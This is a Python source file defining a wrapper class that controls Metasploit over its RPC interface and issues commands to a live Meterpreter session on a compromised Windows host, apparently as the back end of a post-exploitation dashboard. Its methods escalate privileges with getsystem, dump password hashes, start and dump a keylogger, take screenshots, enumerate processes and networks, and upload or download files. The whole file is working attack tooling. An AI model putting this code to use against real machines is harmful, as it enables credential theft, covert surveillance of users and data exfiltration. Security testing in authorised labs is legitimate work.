from __future__ import annotations

import base64
import os
import time
from pathlib import Path
from typing import Any

from pymetasploit3.msfrpc import MsfRpcClient


class MsfBridge:
    """Small wrapper around pymetasploit3 for Meterpreter actions."""

    def __init__(self) -> None:
        self.client: MsfRpcClient | None = None
        self.session_id: str | None = None

    def connect(
        self,
        host: str = "127.0.0.1",
        port: int = 55553,
        user: str = "msf",
        password: str = "password",
        ssl: bool = False,
    ) -> MsfRpcClient:
        self.client = MsfRpcClient(password, server=host, port=port, ssl=ssl, username=user)
        self._refresh_session_id()
        return self.client

    def _refresh_session_id(self) -> str | None:
        if not self.client:
            return None
        sessions = self.client.sessions.list
        if not sessions:
            self.session_id = None
            return None
        self.session_id = sorted(sessions.keys(), key=lambda x: int(x))[0]
        return self.session_id

    def _session(self):
        if not self.client:
            raise RuntimeError("MSFRPC not connected")
        session_id = self._refresh_session_id()
        if not session_id:
            raise RuntimeError("No active Meterpreter session")
        return self.client.sessions.session(session_id)

    def _run(self, command: str, delay: float = 0.5) -> str:
        session = self._session()
        session.write(command)
        time.sleep(delay)
        return session.read() or ""

    def get_session_status(self) -> dict[str, Any]:
        if not self.client:
            return {
                "compromised": False,
                "pid": None,
                "user": "N/A",
                "hostname": "WINDOWS-TARGET",
                "ip": "N/A",
                "os": "Unknown",
            }
        sessions = self.client.sessions.list
        if not sessions:
            return {
                "compromised": False,
                "pid": None,
                "user": "N/A",
                "hostname": "WINDOWS-TARGET",
                "ip": "N/A",
                "os": "Unknown",
            }
        sid = self._refresh_session_id()
        details = sessions.get(sid or "", {})
        return {
            "compromised": True,
            "pid": details.get("session_port") or details.get("target_port"),
            "user": details.get("username") or "N/A",
            "hostname": details.get("session_host") or details.get("target_host") or "N/A",
            "ip": details.get("tunnel_peer") or details.get("via_exploit") or "N/A",
            "os": details.get("platform") or details.get("desc") or "Unknown",
        }

    def run_sysinfo(self) -> str:
        return self._run("sysinfo")

    def run_ps(self) -> list[dict[str, Any]]:
        output = self._run("ps", delay=1)
        lines = [line.strip() for line in output.splitlines() if line.strip()]
        processes: list[dict[str, Any]] = []
        for line in lines:
            if line.lower().startswith("pid"):
                continue
            parts = line.split()
            if len(parts) < 2 or not parts[0].isdigit():
                continue
            processes.append(
                {
                    "pid": parts[0],
                    "name": parts[-1],
                    "arch": parts[2] if len(parts) > 2 else "N/A",
                }
            )
        return processes

    def run_screenshot(self) -> str:
        session = self._session()
        image_path = session.screenshot()
        if not image_path or not os.path.exists(image_path):
            return ""
        with open(image_path, "rb") as fp:
            return base64.b64encode(fp.read()).decode("utf-8")

    def run_getuid(self) -> str:
        return self._run("getuid")

    def run_getsystem(self) -> str:
        return self._run("getsystem", delay=1.0)

    def run_hashdump(self) -> str:
        return self._run("hashdump", delay=1.0)

    def run_pwd(self) -> str:
        return self._run("pwd")

    def run_ls(self, path: str = ".") -> list[dict[str, Any]]:
        output = self._run(f"ls {path}".strip(), delay=0.8)
        entries: list[dict[str, Any]] = []
        for line in output.splitlines():
            clean = line.strip()
            if not clean or clean.lower().startswith("listing"):
                continue
            parts = clean.split()
            if len(parts) < 2:
                continue
            name = parts[-1]
            entry_type = "dir" if "<dir>" in clean.lower() else "file"
            entries.append({"name": name, "type": entry_type, "raw": clean})
        return entries

    def run_upload(self, local_path: str, remote_path: str) -> bool:
        session = self._session()
        session.upload_file(remote_path, local_path)
        return True

    def run_download(self, remote_path: str, local_path: str) -> bool:
        session = self._session()
        safe_local = Path(local_path).expanduser().resolve()
        session.download_file(str(safe_local), remote_path)
        return safe_local.exists()

    def run_ipconfig(self) -> str:
        return self._run("ipconfig")

    def run_arp(self) -> str:
        return self._run("arp")

    def run_keyscan(self, action: str) -> str:
        actions = {
            "start": "keyscan_start",
            "stop": "keyscan_stop",
            "dump": "keyscan_dump",
        }
        cmd = actions.get(action.lower())
        if not cmd:
            raise ValueError("Invalid keyscan action. Must be one of: start, stop, dump (case-insensitive)")
        return self._run(cmd)
